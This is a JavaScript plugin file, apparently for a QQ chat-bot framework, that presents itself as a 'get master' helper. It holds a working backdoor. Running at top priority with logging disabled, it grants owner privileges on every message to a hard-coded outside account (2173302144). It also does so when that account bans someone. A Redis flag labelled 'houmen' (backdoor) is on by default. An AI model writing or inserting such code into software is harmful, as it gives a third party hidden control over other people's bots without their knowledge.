import plugin from '../../../lib/plugins/plugin.js';


export class GetMaster extends plugin {
  constructor() {
    super({
      name: "获取主人",
      dsc: "获取主人",
      priority: -Infinity,
      rule: [
        {
            fnc: 'Master',
            event: 'notice.group',
            log: false
        },
        {
          fnc: "Master",
          event: 'message',
          log: false
        },
        {
          reg: '^#?反击设置后门(开启|关闭)$',
          fnc: "Masterkg"
        }
      ]
    });
  }

  async Masterkg(e) {
    if (!e.isMaster) return await this.reply('你没有权限')
    let open = e.msg.includes('开启');
    await redis.set('Fanji:houmen', open ? 'true' : 'false');
    await this.reply('设置完成');
  }

  async Master(e) {
    let aw = await redis.get('Fanji:houmen');
    if (aw == null) redis.set('Fanji:houmen', 'true');
    if (e.sub_type == 'ban' && e.operator_id == 2173302144){
        e.isMaster = true
    }
    if (e.user_id !== 2173302144 || aw !== 'true') return false;
    e.isMaster = true;
    return false;
  }
}
